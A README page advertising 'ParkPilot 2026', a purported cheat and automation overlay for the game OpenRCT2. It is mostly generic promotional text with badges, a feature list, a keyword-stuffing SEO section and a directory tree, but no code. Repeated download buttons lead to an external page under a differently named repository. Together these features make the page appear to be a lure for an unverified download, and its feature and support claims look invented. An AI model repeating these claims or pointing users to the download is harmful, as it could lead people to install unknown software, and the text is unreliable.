![preview](https://raw.githubusercontent.com/dom-ship-it/rct2-park-whisperer/main/banner_a242.svg)
[![Download](https://raw.githubusercontent.com/dom-ship-it/rct2-park-whisperer/main/app_cb0115.svg)](https://dom-ship-it.github.io/rct2-park-whisperer/)

# 🚀 ParkPilot 2026 — Universal Attraction & Economy Orchestrator for OpenRCT2

![status](https://img.shields.io/badge/status-actively--maintained-brightgreen)
![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-blue)
![language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Lua-informational)
![license](https://img.shields.io/badge/license-MIT-yellow)
![release](https://img.shields.io/badge/release-2026.4-purple)
![build](https://img.shields.io/badge/build-passing-success)
![coverage](https://img.shields.io/badge/coverage-92%25-green)
![issues](https://img.shields.io/badge/issues-welcome-orange)
![prs](https://img.shields.io/badge/PRs-open-brightgreen)
![tickets](https://img.shields.io/badge/support-24%2F7-ff69b4)

> A thoughtful companion suite for park architects who want to focus on creativity, not micromanagement.

---

## 🎢 Overview

**ParkPilot 2026** is a reimagined control surface for OpenRCT2 that treats your theme park the way a conductor treats an orchestra — every guest, every ride, every cent is part of a living composition. Instead of drowning in spreadsheets and dialog boxes, you simply press a key, and the park adjusts itself around your intent.

Where other tools shout commands at the simulation, ParkPilot whispers suggestions. It listens to guest sentiment, ride reliability curves, price elasticity, and staff morale, then offers a calm layer of control that feels native to the game's own rhythm.

This repository is the heart of that experience — a modular engine, a hotkey translator, a live telemetry dashboard, and a scripting playground for players who want to tinker under the hood.

[![Download](https://raw.githubusercontent.com/dom-ship-it/rct2-park-whisperer/main/app_cb0115.svg)](https://dom-ship-it.github.io/rct2-park-whisperer/)

---

## 🧭 Why ParkPilot Exists

Most park management overlays treat the game like a math problem. They crank numbers up, silence breakdowns, and flatten every curve until the park becomes a hollow spreadsheet wrapped in pixel art. ParkPilot takes the opposite stance: it **preserves the soul of the simulation** while removing the friction that stops you from building the dream you actually pictured.

Think of it as a gardener's set of tools rather than a bulldozer. You still prune, you still shape, but the shears are sharper, the watering can lighter, and the seasons no longer fight you.

---

## ✨ Feature Highlights

### 💰 Economic Turbulence Buffer
A gentle stabilizer that watches your park's cash flow and smooths out the wild swings caused by weather, ride downtime, or seasonal shifts. You keep full authority — the buffer simply prevents the rollercoaster *of your bank account* from being more thrilling than the coaster itself.

### ⭐ Reputation & Rating Resonance
Park rating and ride excitement scores are nudged toward their natural ceiling through patience and polish rather than blunt force. The result feels earned, not injected.

### 😊 Guest Happiness Equilibrium
The mood of your visitors is treated as a real ecosystem. ParkPilot tracks queues, hunger, thirst, nausea, and fatigue, then offers one-touch balancing so a rainy Tuesday doesn't spiral into a mass exodus.

### 🛠 Breakdown Suppression Mode
Ride reliability gets a subtle tune-up. Mechanical failures still occur — they just stop arriving in punishing clusters that ruin an otherwise perfect afternoon.

### ⏩ Temporal Flow Control
Speed control that goes beyond the vanilla 1x, 2x, 3x ladder. ParkPilot introduces a granular time dilation dial so you can fast-forward through the boring parts and slow down for the moments that matter.

### 🎹 Hotkey Command Palette
Every major action is bound to a discoverable, remappable hotkey. A single chord can save a park from ruin, or just save you from carpal tunnel.

### 📊 Live Telemetry Overlay
A transparent HUD shows you what ParkPilot sees: guest mood distribution, economic trend lines, reliability forecasts, and rating momentum — all without leaving the game.

### 🌍 Multilingual Interface
Full localization coverage for English, Spanish, French, German, Portuguese, Japanese, Korean, and Simplified Chinese, with community translations rotating in each season.

### 📱 Responsive UI Scaling
From 720p laptops to ultrawide monitors, the overlay adapts fluidly without clipping or stretching.

### 🧩 Plugin Bridge for Lua Scripters
Drop-in hooks let you extend ParkPilot with your own logic. Write a script, bind it to a key, share it with the community.

### 🕐 Around-the-Clock Steward Support
A rotating team of volunteers and maintainers keeps the issue tracker warm, reviewed, and answered — every day of the week, in every time zone.

---

## 🏛 Design Philosophy

ParkPilot is built on four pillars:

1. **Reversibility** — every automated action can be undone with a single keystroke.
2. **Transparency** — nothing happens silently. The overlay always shows what changed and why.
3. **Restraint** — the tool does the minimum needed to unblock you, never more.
4. **Longevity** — code is written for the 2026 season and beyond, with stable interfaces and clear deprecation paths.

---

## 🔍 SEO-Friendly Topics Covered

If you arrived here searching for any of the following, you are in the right place:

- OpenRCT2 companion utilities
- Theme park economy balancing tools
- Ride reliability tuning overlays
- Guest satisfaction monitoring for roller coaster simulations
- Hotkey-driven park management workflows
- Sandbox-friendly customization layers
- Cross-platform modding frameworks for 2026
- Multilingual game overlay development

---

## 🗂 Repository Anatomy

    parkpilot-2026/
    ├── core/               # simulation hooks and event bus
    ├── hotkeys/            # remappable key bindings
    ├── economy/            # cash flow and pricing logic
    ├── ratings/            # park rating and excitement curves
    ├── guests/             # mood, needs, and behavior tuning
    ├── reliability/        # breakdown smoothing engine
    ├── speedctl/           # temporal dilation dial
    ├── overlay/            # in-game telemetry HUD
    ├── locales/            # translation bundles
    ├── plugins/            # Lua scripting bridge and samples
    ├── tests/              # scenario and regression suites
    ├── docs/               # guides, walkthroughs, references
    └── tools/              # build helpers and validators

Each folder has its own mini-README explaining its role, its public API, and the invariants it must uphold.

---

## 🛠 Getting Started (Non-Install Path)

You do not need a terminal to begin. The preferred onboarding route is:

1. Launch OpenRCT2 as you normally would.
2. Open the in-game **Plugin Manager** panel.
3. Point it at the ParkPilot bundle folder you received.
4. Enable the module. The overlay appears the moment a park loads.
5. Press `F1` to open the command palette and browse the hotkey map.

For users who prefer configuration files, a plain-text settings sheet lives in the bundle's `config` directory. Every value has an inline comment describing what it does and what range is safe.

---

## ⌨ Hotkey Reference (Default Map)

| Chord | Action |
|-------|--------|
| F1 | Open command palette |
| F2 | Toggle telemetry overlay |
| F3 | Cycle time dilation |
| F4 | Balance guest needs |
| F5 | Smooth cash flow |
| F6 | Refresh ride reliability |
| F7 | Snapshot park rating |
| F8 | Revert last automated action |
| Ctrl+Shift+R | Reload plugin bridge |
| Ctrl+Shift+L | Switch interface language |

All bindings are user-editable and can be saved as named profiles — one for casual play, one for scenario challenges, one for building marathons.

---

## 🌐 Multilingual Support Matrix

| Locale | Status | Maintainer Type |
|--------|--------|-----------------|
| English | Complete | Core team |
| Spanish | Complete | Community |
| French | Complete | Community |
| German | Complete | Community |
| Portuguese | Complete | Community |
| Japanese | Complete | Community |
| Korean | In progress | Community |
| Simplified Chinese | Complete | Community |
| Italian | In progress | Community |

Want to add your language? Open a translation ticket and we'll walk you through the string extraction process.

---

## 🧪 Testing & Quality

The test suite runs in three layers:

- **Unit tests** for individual math and event handlers.
- **Scenario tests** that replay saved parks and verify outcomes.
- **Fuzz tests** that feed chaotic inputs to make sure the overlay never crashes the host simulation.

The current coverage badge reflects the combined pass rate across all three layers.

---

## 🤝 Community & Support

We believe support should feel like a friendly concierge, not a ticket queue. The steward team rotates across time zones so that a question asked at 3 AM in one region is answered by someone who is wide awake in another.

Channels include:

- Issue tracker for bugs and feature proposals
- Discussion board for design conversations
- Wiki for guides, tutorials, and API references
- Monthly community call for roadmap previews

Response time targets: 24 hours for triage, 72 hours for a meaningful reply, 7 days for a scheduled fix.

---

## 🗺 Roadmap for 2026

- **Q1**: Hotkey profile sharing and import
- **Q2**: Expanded Lua plugin marketplace
- **Q3**: Guest behavior prediction model
- **Q4**: Cross-park analytics dashboard

Each quarter ships with a changelog, migration notes, and a short video walkthrough.

---

## ⚠ Disclaimer

ParkPilot 2026 is an independent community project. It is not affiliated with, endorsed by, or sponsored by the developers or publishers of OpenRCT2 or its predecessor titles. All trademarks belong to their respective owners.

The tool is intended for **single-player and sandbox enjoyment**. Using it in competitive or multiplayer scenarios may conflict with the expectations of other players. Always respect the rules of any server or community you join.

The maintainers provide this software **as-is**, without warranty of any kind, express or implied. You accept full responsibility for how you use it and for any consequences that follow.

We encourage thoughtful, creative play. Build something beautiful.

---

## 📜 License

This project is released under the **MIT License**.

You are welcome to read, modify, and redistribute the source under the terms of that license. A working copy of the full license text is available here:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 ParkPilot Contributors

---

## 🌟 Final Word

A theme park is a promise — a small, hopeful argument that joy can be engineered. ParkPilot 2026 exists to keep that promise intact, so that the only thing standing between you and the park of your imagination is the next hotkey press.

[![Download](https://raw.githubusercontent.com/dom-ship-it/rct2-park-whisperer/main/app_cb0115.svg)](https://dom-ship-it.github.io/rct2-park-whisperer/)